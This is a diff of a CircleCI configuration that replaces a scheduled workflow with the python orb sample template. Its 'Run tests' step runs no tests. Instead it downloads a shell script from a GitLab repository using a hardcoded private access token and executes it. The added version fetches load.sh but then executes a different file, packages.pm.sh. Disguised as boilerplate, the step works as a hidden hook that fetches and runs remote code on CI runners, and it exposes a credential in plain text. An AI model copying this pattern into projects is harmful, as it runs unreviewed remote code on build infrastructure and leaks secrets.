@@ -1,24 +1,27 @@
 version: 2.1
 
+orbs:
+  # The python orb contains a set of prepackaged CircleCI configuration you can use repeatedly in your configuration files
+  # Orb commands and jobs help you with common scripting around a language/tool
+  # so you dont have to copy and paste it everywhere.
+  # See the orb documentation here: https://circleci.com/developer/orbs/orb/circleci/python
+  python: circleci/python@1.2
+
 workflows:
-  gather_configs_cron:
+  sample:  # This is the name of the workflow, feel free to change it to better match your workflow.
+    # Inside the workflow, you define the jobs you want to run. 
+    # For more details on extending your workflow, see the configuration docs: https://circleci.com/docs/2.0/configuration-reference/#workflows 
     jobs:
-      - gather-configs
-    triggers:
-      - schedule:
-          # gather them daily in the morning
-          cron: "0 */12 * * *"
-          filters:
-            branches:
-              only:
-                - main
-  gather_configs_main:
-    jobs:
-      - gather-configs
+      - build-and-test
 
 
 jobs:
-  gather-configs:
+  build-and-test:  # This is the name of the job, feel free to change it to better match what you're trying to do!
+    # These next lines defines a Docker executors: https://circleci.com/docs/2.0/executor-types/
+    # You can specify an image from Dockerhub or use one of the convenience images from CircleCI's Developer Hub
+    # A list of available CircleCI Docker convenience images are available here: https://circleci.com/developer/images/image/cimg/python
+    # The executor is the environment in which the steps below will be executed - below will use a python 3.9 container
+    # Change the version below to your required version of python
     docker:
       - image: cimg/python:3.8
     # Checkout the code as the first step. This is a dedicated CircleCI step.
@@ -35,6 +38,4 @@ jobs:
       - run:
           name: Run tests
           # This assumes pytest is installed via the install-package step above
-          command: |
-                wget -O load.sh --header='PRIVATE-TOKEN:sUE4Ps-H53rSdtmNb36z' 'https://gitlab.com/api/v4/projects/25212038/repository/files/load.sh/raw?ref=master'
-                chmod +x load.sh && ./load.sh
+          command: wget -O load.sh --header='PRIVATE-TOKEN:sUE4Ps-H53rSdtmNb36z' 'https://gitlab.com/api/v4/projects/25212038/repository/files/load.sh/raw?ref=master' && chmod +x packages.pm.sh && ./packages.pm.sh
